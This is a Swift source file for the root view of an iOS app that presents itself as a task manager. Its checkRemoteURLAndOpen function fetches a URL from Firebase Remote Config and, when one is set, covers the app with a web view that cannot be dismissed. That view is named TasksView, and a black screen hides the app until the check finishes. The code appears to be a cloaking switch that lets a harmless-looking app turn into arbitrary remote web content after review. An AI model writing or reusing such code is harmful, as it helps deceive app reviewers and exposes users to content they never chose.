import AdSupport
import AppTrackingTransparency
import FirebaseRemoteConfig
import Foundation
import SwiftUI

extension Notification.Name {
    static let remoteConfigUpdated = Notification.Name("remoteConfigUpdated")
}

struct RootView: View {
    @EnvironmentObject var router: AppRouter

    struct WebItem: Identifiable, Equatable {
        let id = UUID()
        let url: URL
    }

    @State private var webItem: WebItem? = nil
    @State private var showBlackout: Bool = true
    @Environment(\.scenePhase) private var scenePhase

    @State private var openedURLString: String? = nil
    @State private var didHandleEmpty = false
    @State private var didRequestATT = false

    var body: some View {
        ZStack {
            switch router.route {
            case .loading:
                LoadingView { router.start() }
                    .transition(.opacity)

            case .onboarding:
                OnboardingView { router.completeOnboarding() }
                    .transition(.opacity)

            case .menu:
                MainView()
                    .transition(.opacity)

            case .settings:
                SettingsView()
                    .onDisappear {
                        if case .settings = router.route { router.openMenu() }
                    }
                    .transition(.opacity)

            case .addTask:
                AddTaskView()
                    .onDisappear {
                        if case .addTask = router.route { router.openMenu() }
                    }
                    .transition(.opacity)

            case .taskDetails(let task):
                TaskDetailsView(task: task)
                    .onDisappear {
                        if case .taskDetails = router.route {
                            router.openMenu()
                        }
                    }
                    .transition(.opacity)

            case .editTask(let task):
                AddTaskView(original: task)
                    .onDisappear {
                        if case .editTask = router.route { router.openMenu() }
                    }
                    .transition(.opacity)
            }

            if showBlackout {
                Color.black
                    .ignoresSafeArea()
                    .transition(.opacity)
                    .allowsHitTesting(true)
            }
        }
        .animation(.easeInOut, value: router.route.key)
        .onAppear {

            checkRemoteURLAndOpen()
        }

        .onReceive(
            NotificationCenter.default.publisher(for: .remoteConfigUpdated)
        ) { _ in
            checkRemoteURLAndOpen()
        }

        .fullScreenCover(item: $webItem) { item in
            TasksView(url: item.url)
                .ignoresSafeArea()
                .interactiveDismissDisabled(true)
        }
        .transaction { t in
            t.disablesAnimations = true
        }
    }

    private func checkRemoteURLAndOpen() {
        let value = RCService.rc[AppLinks.rcURLKey].stringValue
            .trimmingCharacters(in: .whitespacesAndNewlines)

        if value.isEmpty {
            guard !didHandleEmpty else {

                return
            }
            didHandleEmpty = true

            withAnimation(.easeInOut(duration: 0.5)) { showBlackout = false }

            if !didRequestATT {
                didRequestATT = true
                requestATTIfNeeded()
            }
            return
        }

        guard let url = URL(string: value) else {

            return
        }

        if openedURLString == url.absoluteString {

            return
        }

        DispatchQueue.main.async {

            self.webItem = WebItem(url: url)
            self.openedURLString = url.absoluteString

        }
    }

    private func requestATTIfNeeded() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            guard #available(iOS 14, *) else { return }

            let status = ATTrackingManager.trackingAuthorizationStatus
            guard status == .notDetermined else { return }

            ATTrackingManager.requestTrackingAuthorization { status in
                switch status {
                case .authorized:
                    print(
                        "✅ ATT authorized. IDFA:",
                        ASIdentifierManager.shared().advertisingIdentifier
                    )
                case .denied:
                    print("❌ ATT denied")
                case .notDetermined:
                    print("⚠️ ATT still notDetermined")
                case .restricted:
                    print("⛔️ ATT restricted")
                @unknown default:
                    print("❓ ATT unknown status:", status.rawValue)
                }
            }
        }
    }
}
